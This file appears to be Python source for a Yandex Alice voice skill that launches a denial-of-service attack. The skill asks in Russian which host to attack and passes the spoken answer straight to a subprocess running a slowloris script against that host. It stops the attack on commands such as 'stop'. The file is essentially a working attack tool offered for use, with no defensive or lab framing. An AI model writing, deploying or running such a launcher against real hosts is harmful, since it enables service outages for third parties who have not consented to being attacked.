import subprocess
from aiohttp import web

from aioalice import Dispatcher, get_new_configured_app
from aioalice.dispatcher import MemoryStorage

from states import DosStates


WEBHOOK_URL_PATH = '/my-alice-webhook/'

WEBAPP_PORT = 8080


dp = Dispatcher(storage=MemoryStorage())


async def select_host(alice_request):
    user_id = alice_request.session.user_id
    await dp.storage.update_data(user_id=user_id,
                                 data={'dos': None})
    await dp.storage.set_state(user_id, DosStates.SELECT_HOST)


@dp.request_handler(func=lambda areq: areq.session.new)
async def handle_new_session(alice_request):
    await select_host(alice_request)
    return alice_request.response('Привет! Какой хост атакуем ?')


@dp.request_handler(commands=['атаковать', 'атака'])
async def handle_start_attack(alice_request):
    await select_host(alice_request)
    return alice_request.response('Какой хост атакуем ?')


@dp.request_handler(state=DosStates.SELECT_HOST)
async def handle_select_host(alice_request):
    user_id = alice_request.session.user_id
    request_text = alice_request.request.original_utterance
    proc = subprocess.Popen(
        ['python', './src/slowloris.py', request_text]
    )
    await dp.storage.update_data(user_id=user_id,
                                 data={'dos': proc})
    await dp.storage.set_state(user_id, DosStates.START_ATTACK)
    print(proc.pid)
    return alice_request.response('Пакетики полетели')


@dp.request_handler(state=DosStates.START_ATTACK,
                    commands=['стоп', 'хватит', 'прекрати',
                              'остановись', 'нельзя', 'фу'])
async def handle_stop_attack(alice_request):
    user_id = alice_request.session.user_id
    data = await dp.storage.get_data(user_id)
    proc = data['dos']
    proc.terminate()
    await dp.storage.reset_state(user_id)
    return alice_request.response('Остановочка',
                                  buttons=['Атаковать'])


@dp.request_handler()
async def handle_other_commands(alice_request):
    return alice_request.response('Читай доки',
                                  buttons=['Атаковать'])


if __name__ == '__main__':
    app = get_new_configured_app(dispatcher=dp, path=WEBHOOK_URL_PATH)
    web.run_app(app, host='127.0.0.1', port=WEBAPP_PORT)
